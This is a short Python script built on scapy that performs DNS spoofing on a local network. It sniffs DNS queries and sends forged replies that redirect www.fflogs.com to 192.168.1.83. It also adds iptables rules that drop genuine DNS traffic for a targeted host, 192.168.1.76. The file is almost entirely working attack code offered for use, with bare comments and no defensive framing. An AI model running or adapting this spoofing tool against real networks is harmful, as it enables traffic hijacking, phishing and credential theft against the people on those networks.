#using Cython to compile the code

from cython import *
import scapy.all as scapy
import os

#sniffpackets function
def sniffpackets(interface):
    #sniff for DNS traffic
    scapy.sniff(iface=interface,count=0,filter="udp", store=False, prn=process_sniffed_packet)

def create_packet(packet):
    #create a new packet using info from original packet
    #eth
    eth = scapy.Ether(dst=packet[scapy.Ether].src,src=packet[scapy.Ether].dst)
    #ip
    ip = scapy.IP(src=packet[scapy.IP].dst,dst=packet[scapy.IP].src)
    #udp
    udp = scapy.UDP(sport=packet[scapy.UDP].dport,dport=packet[scapy.UDP].sport)
    #dns
    dns = scapy.DNS(
        id=packet[scapy.DNS].id,
        qd=packet[scapy.DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=scapy.DNSRR(
            rrname=packet[scapy.DNS].qd.qname,
            type='A',
            ttl=100,
            rdata='192.168.1.83'
            )
        )
    #return the packet
    return eth/ip/udp/dns

def process_sniffed_packet(packet):
    if packet.haslayer(scapy.DNSQR):
        #reply with spoofed packet
        qname = packet[scapy.DNSQR].qname.decode()
        print(qname)
        if packet.getlayer(scapy.DNSQR).qname == 'www.fflogs.com.':
            print('[+] Spoofing packet')
            packet.show()
            new_packet = create_packet(packet)
            scapy.sendp(new_packet)


def main():
    print("[+] Starting DNS spoofing...")
    sniffpackets("wlo1")

if __name__ == "__main__":
    os.system("iptables -A FORWARD -p udp --sport 53 -d 192.168.1.76 -j DROP")
    os.system("iptables -A FORWARD -p tcp --sport 53 -d 192.168.1.76 -j DROP")
    os.system("iptables -A FORWARD -p udp --sport 53 -s 192.168.1.76 -j DROP")
    os.system("iptables -A FORWARD -p tcp --sport 53 -s 192.168.1.76 -j DROP")
    main()